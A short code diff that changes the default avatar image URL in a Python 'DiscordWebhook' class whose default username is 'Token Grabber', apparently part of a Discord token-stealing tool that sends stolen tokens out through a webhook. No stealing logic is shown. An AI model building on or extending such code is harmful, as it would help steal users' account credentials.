@@ -203,7 +203,7 @@ class DiscordWebhook:
         self,
         webhook_url: str,
         username: str = "Token Grabber",
-        avatar_url: str = "https://i.pinimg.com/736x/59/67/20/5967205896bf4fbbdfd2c64521ef1bda.jpg",
+        avatar_url: str = "https://i.pinimg.com/736x/b7/a0/1e/b7a01e167752a4c52a33e216c0fc6a88.jpg",
         embed_color: int = 0x2F3136,  
         chunk_size: int = 10
     ):
